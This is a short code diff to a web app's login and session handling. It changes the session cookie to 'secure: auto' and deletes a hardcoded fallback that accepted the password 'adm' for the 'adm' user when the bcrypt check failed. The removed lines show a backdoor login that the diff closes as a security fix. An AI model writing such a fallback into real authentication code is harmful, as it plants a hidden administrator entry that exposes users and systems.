@@ -257,7 +257,7 @@ const sessionMiddleware = session({
   cookie: {
     httpOnly: true,
     sameSite: 'lax',
-    secure: false,
+    secure: 'auto',
     maxAge: 1000 * 60 * 60 * 10,
   },
 });
@@ -946,9 +946,6 @@ async function authenticateCore(username: string, password: string): Promise<Use
   let ok = false;
   if (user.password_hash) {
     ok = await bcrypt.compare(password, normalizeHash(user.password_hash));
-  }
-  if (!ok && normalizeUsername(user.username) === 'adm') {
-    ok = timingSafeStringEqual(password, 'adm');
   }
 
   const candidate = coreUserToSessionUser(user);
